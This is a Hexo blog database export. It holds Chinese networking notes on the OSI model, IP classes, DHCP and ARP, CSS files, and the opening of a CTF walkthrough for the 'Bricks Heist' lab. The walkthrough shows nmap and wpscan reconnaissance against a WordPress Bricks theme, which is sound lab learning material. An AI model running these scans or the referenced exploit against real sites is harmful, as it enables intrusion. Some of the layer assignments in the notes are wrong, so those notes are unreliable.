有PAP和CHAP两种方式</p>\n</li>\n<li><p>PPPoE协议<br>，以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。</p>\n</li>\n</ul>\n<h3 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" title=\"网络层\"></a>网络层</h3><p>网络层是<strong>互联网通信过程</strong>的一部分，这是连接发生的地方，在不同网络之间来回<strong>发送数据包</strong>来进行通信，处理不同网络之间的数据路由和发送。</p>\n<p>用于将接收到的数据段从一台计算机传输到位于不同网络中的另一台计算机。</p>\n<p>第三层的数据单元为<strong>数据包</strong></p>\n<h4 id=\"功能-1\"><a href=\"#功能-1\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ol>\n<li>寻址<br>对网络层而言使用IP地址来<strong>唯一标识</strong>互联网上的各个寻址，网络层依靠IP地址进行<strong>相互通信</strong>（类似于MAC地址），详细的编址方案参见IPv4和IPv6。<br></li>\n<li>路由<br>在同一个网络中的内部通信并不需要网络层设备，仅仅靠数据链路层就可以完成相互通信，对于不同的网络之间相互通信则必须借助路由器等三层设备。</li>\n</ol>\n<h4 id=\"网络层协议\"><a href=\"#网络层协议\" class=\"headerlink\" title=\"网络层协议\"></a>网络层协议</h4><ul>\n<li>IP （V4、V6）</li>\n<li>ICMP（V4、V6）</li>\n<li>IPsec</li>\n<li>RIP</li>\n<li>OSPF</li>\n</ul>\n<h4 id=\"具有网络层功能的设备\"><a href=\"#具有网络层功能的设备\" class=\"headerlink\" title=\"具有网络层功能的设备\"></a>具有网络层功能的设备</h4><ul>\n<li>路由</li>\n<li>三层交换机</li>\n</ul>\n<h3 id=\"传输层\"><a href=\"#传输层\" class=\"headerlink\" title=\"传输层\"></a>传输层</h3><p>传输层通过分段、流量控制和差错控制来控制通信的可靠性。支持不同主机上运行的应用程序之间的端到端通信。</p>\n<p>第四次的数据单元可以说<strong>报文段</strong>或<strong>数据段</strong>(<strong>tcp</strong>)和<strong>数据报</strong>(<strong>udp</strong>)</p>\n<h4 id=\"协议-1\"><a href=\"#协议-1\" class=\"headerlink\" title=\"协议\"></a>协议</h4><ul>\n<li>tcp</li>\n<li>udp</li>\n</ul>\n<h3 id=\"会话层\"><a href=\"#会话层\" class=\"headerlink\" title=\"会话层\"></a>会话层</h3><p>主要利用传输层提供的端到端数据传输服务，为两个会话层实体进行<strong>会话</strong>（Session），而进行的对话连接的管理服务。</p>\n<h4 id=\"会话层服务\"><a href=\"#会话层服务\" class=\"headerlink\" title=\"会话层服务\"></a>会话层服务</h4><ul>\n<li>认证</li>\n<li>权限</li>\n<li>会话恢复</li>\n</ul>\n<h4 id=\"会话层协议\"><a href=\"#会话层协议\" class=\"headerlink\" title=\"会话层协议\"></a>会话层协议</h4><ul>\n<li>PAP, 密码认证协议</li>\n<li>PPTP, 点对点隧道协议</li>\n<li>L2TP, 第二层隧道协议</li>\n<li>RPC, 远程过程调用</li>\n<li>SDP, 套接字直接协议</li>\n</ul>\n<h3 id=\"表示层\"><a href=\"#表示层\" class=\"headerlink\" title=\"表示层\"></a>表示层</h3><p>表示层向上对应用层服务，向下接受来自会话层的服务。表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义</p>\n<p>表示层从应用层接收数据。这些数据是以字符和数字的形式出现的，表示层将这些字符和数字转换成机器可理解的二进制格式。</p>\n<p>为不同终端的上层用户提供数据和信息正确的语法表示变换方法。表示层确保数据以应用层可以理解的形式传递。处理数据编码、压缩和加密。</p>\n<h4 id=\"表示层的主要功能\"><a href=\"#表示层的主要功能\" class=\"headerlink\" title=\"表示层的主要功能\"></a>表示层的主要功能</h4><ul>\n<li>数据语法转换</li>\n<li>语法表示</li>\n<li>连接管理</li>\n<li>数据处理</li>\n<li>数据加密和解密</li>\n<li>数据压缩和解压</li>\n<li>数据编码和解码</li>\n</ul>\n<h4 id=\"表示层协议\"><a href=\"#表示层协议\" class=\"headerlink\" title=\"表示层协议\"></a>表示层协议</h4><ul>\n<li>HTTP&#x2F;HTTPS</li>\n<li>FTP&#x2F;FTPS</li>\n<li>SSH</li>\n<li>Telnet</li>\n<li>ASN.1</li>\n</ul>\n<h3 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h3><p>用层直接和应用程序接口结合，并提供常见的网络应用服务。应用层也向第六层表示层发出请求。</p>\n<p>应用层直接向最终用户应用程序提供网络服务。</p>\n<h4 id=\"协议-2\"><a href=\"#协议-2\" class=\"headerlink\" title=\"协议\"></a>协议</h4><ul>\n<li>DHCP</li>\n<li>DNS</li>\n<li>FTP</li>\n<li>POP3</li>\n</ul>\n<p>简单来说 假如你在给你的异地女朋友发微信信息 微信这个app就是属于<strong>应用层</strong> 将你发的这个信息转化为机器<strong>能够懂的适合传输</strong>的形式 这个就是<strong>表示层</strong>的作用 这个信息要发给你的女朋友 你和女朋友的微信会创建一个<strong>会话连接</strong> 会话层会在信息发过去的时候<strong>保证传输</strong>顺利进行 传输层会把数据<strong>分成</strong>适合传输的<strong>数据包</strong>进行传输 网络层会规划一条<strong>合适的路径</strong>传输信息 数据链路层会通过物理网络将<strong>数据包传给</strong>物理层 物理层就能把数据包发送到接收方手机 就能接收到发送方的信息</p>\n<h2 id=\"tcp-ip模型\"><a href=\"#tcp-ip模型\" class=\"headerlink\" title=\"tcp&#x2F;ip模型\"></a>tcp&#x2F;ip模型</h2><ul>\n<li>应用层</li>\n<li>传输层</li>\n<li>网络接口层</li>\n<li>链路层</li>\n</ul>\n<h2 id=\"ip地址\"><a href=\"#ip地址\" class=\"headerlink\" title=\"ip地址\"></a>ip地址</h2><p>由网络号和主机号组成</p>\n<p>A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255</p>\n<p>B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255</p>\n<p>C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255</p>\n<p>D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）</p>\n<p>E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。</p>\n<p>0.0.0.0用来寻找自己的ip</p>\n<h3 id=\"私有地址\"><a href=\"#私有地址\" class=\"headerlink\" title=\"私有地址\"></a>私有地址</h3><ul>\n<li>A类 10.0.0.0 - 10.255.255.255 (10&#x2F;8)</li>\n<li>B类 172.16.0.0 - 172.31.255.255 (172.16&#x2F;12)</li>\n<li>C类 192.168.0.0 - 192.168.255.255 (192.168&#x2F;16)</li>\n</ul>\n<h2 id=\"dhcp协议\"><a href=\"#dhcp协议\" class=\"headerlink\" title=\"dhcp协议\"></a>dhcp协议</h2><p>动态主机配置协议 用于集中对用户IP地址进行动态管理和配置。</p>\n<h3 id=\"DHCP遵循四个步骤：发现、提供、请求和确认-DORA-：\"><a href=\"#DHCP遵循四个步骤：发现、提供、请求和确认-DORA-：\" class=\"headerlink\" title=\"DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：\"></a>DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：</h3><ul>\n<li>DHCP发现：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。</li>\n<li>DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。</li>\n<li>DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。</li>\n<li>DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。</li>\n</ul>\n<h2 id=\"arp协议\"><a href=\"#arp协议\" class=\"headerlink\" title=\"arp协议\"></a>arp协议</h2><p>arp协议(地址解析协议) IP地址对mac地址的映射 询问IP地址对应的mac地址</p>\n<p>目标 MAC 地址<br>源 MAC 地址</p>\n","excerpt":"","more":"<h1 id=\"网络知识的介绍\"><a href=\"#网络知识的介绍\" class=\"headerlink\" title=\"网络知识的介绍\"></a>网络知识的介绍</h1><h2 id=\"osi七层模型\"><a href=\"#osi七层模型\" class=\"headerlink\" title=\"osi七层模型\"></a>osi七层模型</h2><p>OSI 模型是一个描述网络功能的概念框架。简单来说，OSI 模型标对计算机系统彼此之间发送信息的方式进行了标准化。</p>\n<p>分为：</p>\n<ul>\n<li>物理层</li>\n<li>数据链路层</li>\n<li>网络层</li>\n<li>传输层</li>\n<li>会话层</li>\n<li>表示层</li>\n<li>应用层</li>\n</ul>\n<h3 id=\"物理层\"><a href=\"#物理层\" class=\"headerlink\" title=\"物理层\"></a>物理层</h3><p><strong>物理层</strong>（Physical Layer）是计算机网络OSI模型中<strong>最低</strong>的一层，也是<strong>最基本</strong>的一层。简单的说，网络的物理层面确保<strong>原始的数据</strong>可在各种<strong>物理媒体</strong>上<strong>传输</strong>。</p>\n<p>物理层规定：为传输数据，需要<strong>物理链路</strong>与<strong>设备</strong>的建立、维持、拆除，并具有<strong>机械的</strong>、<strong>电子的</strong>、<strong>功能的</strong>、<strong>规范</strong>的特性。</p>\n<p>第一层的数据单元是<strong>比特</strong>（bit）。</p>\n<h4 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ol>\n<li><p>为数据段设备提供传输数据的通路</p>\n</li>\n<li><p>传输数据</p>\n</li>\n</ol>\n<h4 id=\"常见物理层设备\"><a href=\"#常见物理层设备\" class=\"headerlink\" title=\"常见物理层设备\"></a>常见物理层设备</h4><ul>\n<li>光纤</li>\n<li>CAT-5线</li>\n<li>CAT-6线</li>\n<li>CAT-7线</li>\n<li>RJ-45接头</li>\n<li>集线器</li>\n<li>串口</li>\n<li>并口</li>\n</ul>\n<h4 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h4><ul>\n<li>曼彻斯特编码 </li>\n<li>差分曼彻斯特编码</li>\n</ul>\n<h3 id=\"数据链路层\"><a href=\"#数据链路层\" class=\"headerlink\" title=\"数据链路层\"></a>数据链路层</h3><p>数据链路层（Data Link Layer）是OSI参考模型<strong>第二层</strong>，位于物理层与网络层之间。可以细分成<strong>介质访问控制（MAC）子层</strong>和<strong>逻辑链路控制（LLC）子层</strong>。</p>\n<h4 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h4><p>数据链路层用于跨物理层在<strong>网段节点</strong>之间传输数据，通常指以太网、无线局域网等通信手段。数据链路层提供了在网络的两个实体之间传输数据的功能，并且提供了<strong>差错检测</strong>用于<strong>纠正</strong>物理层中发生的错误。</p>\n<p>只提供导线的一端到另一端（本质是点到点）的<strong>数据传输</strong>。</p>\n<p>数据链路层的以太网协议规定了一组二进制电信号为<strong>数据帧</strong>，数据帧的报头 head 就包含<strong>目标 MAC 地址</strong>和<strong>源 MAC 地址</strong></p>\n<p>第二层的数据单元是 <strong>帧</strong>（frame）。</p>\n<p>帧都包括一个帧头 主题和一个帧尾</p>\n<ul>\n<li>帧头：源节点和目的节点的mac地址</li>\n<li>主体：要传输的比特</li>\n<li>帧尾：包括错误检测信息</li>\n</ul>\n<h4 id=\"常见数据链路层的设备\"><a href=\"#常见数据链路层的设备\" class=\"headerlink\" title=\"常见数据链路层的设备\"></a>常见数据链路层的设备</h4><ul>\n<li>网卡（物理层和数据链路层的MAC子层）</li>\n<li>交换机 是数据链路层设备。</li>\n<li>桥接器（又称网桥）</li>\n</ul>\n<h4 id=\"协议\"><a href=\"#协议\" class=\"headerlink\" title=\"协议\"></a>协议</h4><p>异步传输模式</p>\n<ul>\n<li><p>VLAN（IEEE 802.1Q）</p>\n</li>\n<li><p>以太网（IEEE 802.3）</p>\n</li>\n<li><p>Wi-Fi（IEEE 802.11）</p>\n</li>\n<li><p>PPP协议<br>点对点协议 一种数据链路层封装协议 有PAP和CHAP两种方式</p>\n</li>\n<li><p>PPPoE协议<br>，以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。</p>\n</li>\n</ul>\n<h3 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" title=\"网络层\"></a>网络层</h3><p>网络层是<strong>互联网通信过程</strong>的一部分，这是连接发生的地方，在不同网络之间来回<strong>发送数据包</strong>来进行通信，处理不同网络之间的数据路由和发送。</p>\n<p>用于将接收到的数据段从一台计算机传输到位于不同网络中的另一台计算机。</p>\n<p>第三层的数据单元为<strong>数据包</strong></p>\n<h4 id=\"功能-1\"><a href=\"#功能-1\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ol>\n<li>寻址<br>对网络层而言使用IP地址来<strong>唯一标识</strong>互联网上的各个寻址，网络层依靠IP地址进行<strong>相互通信</strong>（类似于MAC地址），详细的编址方案参见IPv4和IPv6。<br></li>\n<li>路由<br>在同一个网络中的内部通信并不需要网络层设备，仅仅靠数据链路层就可以完成相互通信，对于不同的网络之间相互通信则必须借助路由器等三层设备。</li>\n</ol>\n<h4 id=\"网络层协议\"><a href=\"#网络层协议\" class=\"headerlink\" title=\"网络层协议\"></a>网络层协议</h4><ul>\n<li>IP （V4、V6）</li>\n<li>ICMP（V4、V6）</li>\n<li>IPsec</li>\n<li>RIP</li>\n<li>OSPF</li>\n</ul>\n<h4 id=\"具有网络层功能的设备\"><a href=\"#具有网络层功能的设备\" class=\"headerlink\" title=\"具有网络层功能的设备\"></a>具有网络层功能的设备</h4><ul>\n<li>路由</li>\n<li>三层交换机</li>\n</ul>\n<h3 id=\"传输层\"><a href=\"#传输层\" class=\"headerlink\" title=\"传输层\"></a>传输层</h3><p>传输层通过分段、流量控制和差错控制来控制通信的可靠性。支持不同主机上运行的应用程序之间的端到端通信。</p>\n<p>第四次的数据单元可以说<strong>报文段</strong>或<strong>数据段</strong>(<strong>tcp</strong>)和<strong>数据报</strong>(<strong>udp</strong>)</p>\n<h4 id=\"协议-1\"><a href=\"#协议-1\" class=\"headerlink\" title=\"协议\"></a>协议</h4><ul>\n<li>tcp</li>\n<li>udp</li>\n</ul>\n<h3 id=\"会话层\"><a href=\"#会话层\" class=\"headerlink\" title=\"会话层\"></a>会话层</h3><p>主要利用传输层提供的端到端数据传输服务，为两个会话层实体进行<strong>会话</strong>（Session），而进行的对话连接的管理服务。</p>\n<h4 id=\"会话层服务\"><a href=\"#会话层服务\" class=\"headerlink\" title=\"会话层服务\"></a>会话层服务</h4><ul>\n<li>认证</li>\n<li>权限</li>\n<li>会话恢复</li>\n</ul>\n<h4 id=\"会话层协议\"><a href=\"#会话层协议\" class=\"headerlink\" title=\"会话层协议\"></a>会话层协议</h4><ul>\n<li>PAP, 密码认证协议</li>\n<li>PPTP, 点对点隧道协议</li>\n<li>L2TP, 第二层隧道协议</li>\n<li>RPC, 远程过程调用</li>\n<li>SDP, 套接字直接协议</li>\n</ul>\n<h3 id=\"表示层\"><a href=\"#表示层\" class=\"headerlink\" title=\"表示层\"></a>表示层</h3><p>表示层向上对应用层服务，向下接受来自会话层的服务。表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义</p>\n<p>表示层从应用层接收数据。这些数据是以字符和数字的形式出现的，表示层将这些字符和数字转换成机器可理解的二进制格式。</p>\n<p>为不同终端的上层用户提供数据和信息正确的语法表示变换方法。表示层确保数据以应用层可以理解的形式传递。处理数据编码、压缩和加密。</p>\n<h4 id=\"表示层的主要功能\"><a href=\"#表示层的主要功能\" class=\"headerlink\" title=\"表示层的主要功能\"></a>表示层的主要功能</h4><ul>\n<li>数据语法转换</li>\n<li>语法表示</li>\n<li>连接管理</li>\n<li>数据处理</li>\n<li>数据加密和解密</li>\n<li>数据压缩和解压</li>\n<li>数据编码和解码</li>\n</ul>\n<h4 id=\"表示层协议\"><a href=\"#表示层协议\" class=\"headerlink\" title=\"表示层协议\"></a>表示层协议</h4><ul>\n<li>HTTP&#x2F;HTTPS</li>\n<li>FTP&#x2F;FTPS</li>\n<li>SSH</li>\n<li>Telnet</li>\n<li>ASN.1</li>\n</ul>\n<h3 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h3><p>用层直接和应用程序接口结合，并提供常见的网络应用服务。应用层也向第六层表示层发出请求。</p>\n<p>应用层直接向最终用户应用程序提供网络服务。</p>\n<h4 id=\"协议-2\"><a href=\"#协议-2\" class=\"headerlink\" title=\"协议\"></a>协议</h4><ul>\n<li>DHCP</li>\n<li>DNS</li>\n<li>FTP</li>\n<li>POP3</li>\n</ul>\n<p>简单来说 假如你在给你的异地女朋友发微信信息 微信这个app就是属于<strong>应用层</strong> 将你发的这个信息转化为机器<strong>能够懂的适合传输</strong>的形式 这个就是<strong>表示层</strong>的作用 这个信息要发给你的女朋友 你和女朋友的微信会创建一个<strong>会话连接</strong> 会话层会在信息发过去的时候<strong>保证传输</strong>顺利进行 传输层会把数据<strong>分成</strong>适合传输的<strong>数据包</strong>进行传输 网络层会规划一条<strong>合适的路径</strong>传输信息 数据链路层会通过物理网络将<strong>数据包传给</strong>物理层 物理层就能把数据包发送到接收方手机 就能接收到发送方的信息</p>\n<h2 id=\"tcp-ip模型\"><a href=\"#tcp-ip模型\" class=\"headerlink\" title=\"tcp&#x2F;ip模型\"></a>tcp&#x2F;ip模型</h2><ul>\n<li>应用层</li>\n<li>传输层</li>\n<li>网络接口层</li>\n<li>链路层</li>\n</ul>\n<h2 id=\"ip地址\"><a href=\"#ip地址\" class=\"headerlink\" title=\"ip地址\"></a>ip地址</h2><p>由网络号和主机号组成</p>\n<p>A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255</p>\n<p>B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255</p>\n<p>C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255</p>\n<p>D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）</p>\n<p>E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。</p>\n<p>0.0.0.0用来寻找自己的ip</p>\n<h3 id=\"私有地址\"><a href=\"#私有地址\" class=\"headerlink\" title=\"私有地址\"></a>私有地址</h3><ul>\n<li>A类 10.0.0.0 - 10.255.255.255 (10&#x2F;8)</li>\n<li>B类 172.16.0.0 - 172.31.255.255 (172.16&#x2F;12)</li>\n<li>C类 192.168.0.0 - 192.168.255.255 (192.168&#x2F;16)</li>\n</ul>\n<h2 id=\"dhcp协议\"><a href=\"#dhcp协议\" class=\"headerlink\" title=\"dhcp协议\"></a>dhcp协议</h2><p>动态主机配置协议 用于集中对用户IP地址进行动态管理和配置。</p>\n<h3 id=\"DHCP遵循四个步骤：发现、提供、请求和确认-DORA-：\"><a href=\"#DHCP遵循四个步骤：发现、提供、请求和确认-DORA-：\" class=\"headerlink\" title=\"DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：\"></a>DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：</h3><ul>\n<li>DHCP发现：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。</li>\n<li>DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。</li>\n<li>DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。</li>\n<li>DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。</li>\n</ul>\n<h2 id=\"arp协议\"><a href=\"#arp协议\" class=\"headerlink\" title=\"arp协议\"></a>arp协议</h2><p>arp协议(地址解析协议) IP地址对mac地址的映射 询问IP地址对应的mac地址</p>\n<p>目标 MAC 地址<br>源 MAC 地址</p>\n"},{"_content":".aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {\n    left: -66px !important;\n    /* 默认情况下缩进左侧66px，只留一点箭头部分 */\n  }\n  \n  .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {\n    left: 0 !important;\n    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */\n  }","source":"css/music.css","raw":".aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {\n    left: -66px !important;\n    /* 默认情况下缩进左侧66px，只留一点箭头部分 */\n  }\n  \n  .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {\n    left: 0 !important;\n    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */\n  }","date":"2025-01-22T05:15:25.781Z","updated":"2024-12-29T14:00:59.669Z","path":"css/music.css","layout":"false","title":"","comments":1,"_id":"cm74njvxd0009tsg6cdgleucz","content":".aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {\n    left: -66px !important;\n    /* 默认情况下缩进左侧66px，只留一点箭头部分 */\n  }\n  \n  .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {\n    left: 0 !important;\n    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */\n  }"},{"title":"categories","date":"2024-12-30T02:59:15.000Z","_content":"","source":"categories/index-1.md","raw":"---\ntitle: categories\ndate: 2024-12-30 10:59:15\n---\n","updated":"2025-02-03T08:44:25.154Z","path":"categories/index-1.html","comments":1,"layout":"page","_id":"cm74njvxe000dtsg6gfkm10a9","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"categories","date":"2024-12-30T01:24:28.000Z","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2024-12-30 09:24:28\n---\n","updated":"2024-12-30T01:24:28.854Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cm74njvxe000ftsg6dcz825gj","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"about","date":"2025-02-03T09:08:39.000Z","top_img":"transparent","_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2025-02-03 17:08:39\ntop_img: transparent\n---\n","updated":"2025-02-03T09:24:40.452Z","path":"about/index.html","comments":1,"layout":"page","_id":"cm74njvxf000itsg65eim06zx","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"_content":"/* 文章页背景 */\n.layout_post>#post {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n\n/* 所有页面背景 */\n#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n\n/* 侧边卡片的透明度 */\n:root {\n  --card-bg: rgba(255, 255, 255, 0.7);\n}\n\n/* 页脚透明 */\n#footer {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n","source":"css/touming.css","raw":"/* 文章页背景 */\n.layout_post>#post {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n\n/* 所有页面背景 */\n#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n\n/* 侧边卡片的透明度 */\n:root {\n  --card-bg: rgba(255, 255, 255, 0.7);\n}\n\n/* 页脚透明 */\n#footer {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n","date":"2025-02-03T06:36:14.156Z","updated":"2025-02-03T06:36:14.156Z","path":"css/touming.css","layout":"false","title":"","comments":1,"_id":"cm74njvxg000ltsg6di63ab41","content":"/* 文章页背景 */\n.layout_post>#post {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n\n/* 所有页面背景 */\n#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n\n/* 侧边卡片的透明度 */\n:root {\n  --card-bg: rgba(255, 255, 255, 0.7);\n}\n\n/* 页脚透明 */\n#footer {\n  /* 透明度为 0.7 */\n  background: rgba(255, 255, 255, 0.7);\n}\n"},{"title":"movies","date":"2024-12-30T11:33:01.000Z","top_img":"transparent","_content":"","source":"movies/index.md","raw":"---\ntitle: movies\ndate: 2024-12-30 19:33:01\ntop_img: transparent\n---\n","updated":"2024-12-30T13:36:40.053Z","path":"movies/index.html","comments":1,"layout":"page","_id":"cm74njvxh000otsg608ey6wwt","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"music","date":"2024-12-29T14:24:07.000Z","top_img":"transparent","_content":"","source":"music/index.md","raw":"---\ntitle: music\ndate: 2024-12-29 22:24:07\ntop_img: transparent\n---\n","updated":"2024-12-30T13:33:30.972Z","path":"music/index.html","comments":1,"layout":"page","_id":"cm74njvxi000rtsg657t12294","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"search","date":"2025-02-03T13:03:34.000Z","_content":"","source":"search/index.md","raw":"---\ntitle: search\ndate: 2025-02-03 21:03:34\n---\n","updated":"2025-02-03T13:03:34.718Z","path":"search/index.html","comments":1,"layout":"page","_id":"cm74njvxj000vtsg64kx29avk","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"tags","date":"2024-12-30T02:59:10.000Z","_content":"","source":"tags/index-1.md","raw":"---\ntitle: tags\ndate: 2024-12-30 10:59:10\n---\n","updated":"2024-12-30T02:59:10.727Z","path":"tags/index-1.html","comments":1,"layout":"page","_id":"cm74njvxj000ytsg610zz1pi0","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"tags","date":"2024-12-30T11:33:11.000Z","_content":"","source":"tags/index-2.md","raw":"---\ntitle: tags\ndate: 2024-12-30 19:33:11\n---\n","updated":"2024-12-30T11:33:11.826Z","path":"tags/index-2.html","comments":1,"layout":"page","_id":"cm74njvxk0011tsg6ddar8vjt","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"tags","date":"2024-12-30T01:24:16.000Z","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2024-12-30 09:24:16\n---\n","updated":"2024-12-30T01:24:16.647Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cm74njvxk0014tsg612jm6oac","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""}],"Post":[{"title":"Bricks Heist 教程","date":"2025-01-25T14:12:02.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/02/01/9PhqARN1ybnjfkJ.jpg","_content":"### 祝师傅们2025越来越好 技术越来越牛 \n\n# Bricks Heist教程\n我们看一下Bricks Heist 这个简单挑战\n![title](/images/Bricks-Heist-教程/title.png)\n\n这个是题目\n\n![title](/images/Bricks-Heist-教程/ask.png)\n\n我们先把自己的机子ip和bricks.thm绑到/etc/hosts里面\n\n![hosts](/images/Bricks-Heist-教程/hosts.png)\n\n连接上openvpn之后咱正式开搞\n\n## 第一步\n先nmap开扫 可以看到他们开放了22，80和443端口\n\n![nmap](/images/Bricks-Heist-教程/nmap.png)\n\n![nmap](/images/Bricks-Heist-教程/duankou.png)\n\n\n## 第二步\n我们在浏览器那搜索ip地址和域名 看一下有什么结果吗\n\n直接输ip的话是啥也没有\n\n![ip](/images/Bricks-Heist-教程/ip.png)\n\n我们换成域名试一试 发现成功了\n\n![brick](/images/Bricks-Heist-教程/brick.png)\n\n\n## 第三步\n我们把这个拉到wpscan里面扫描一下\n\n```\nwpscan --url https://bricks.thm/ --disable-ssl-checks\n```\n\n为什么要加--disable-ssl-checks这个参数捏 不加的话他会报错 说目标网站的 SSL/TLS 证书不正确或无法验证\n\n![scan](/images/Bricks-Heist-教程/scan1.png)\n\n<strong>--disable-ssl-checks</strong> 参数可以让你在面对无效证书（如自签名证书、过期证书等）时继续进行扫描，跳过 SSL/TLS 证书验证检查。\n\n扫描结果我们可以发现在robots.txt中有两个可疑的路径\n\n![scan](/images/Bricks-Heist-教程/wpscan.png)\n\n第二个呢 就是wordpess的主题 bricks和主题版本1.9.5\n\n![scan](/images/Bricks-Heist-教程/wpscan3.png)\n\n结合这两个信息 咱可以在浏览器搜搜有什么漏洞吗 成功发现一个 把他的python下载到机子里面\n\n![loudong](/images/Bricks-Heist-教程/ludong.png)\n\n## 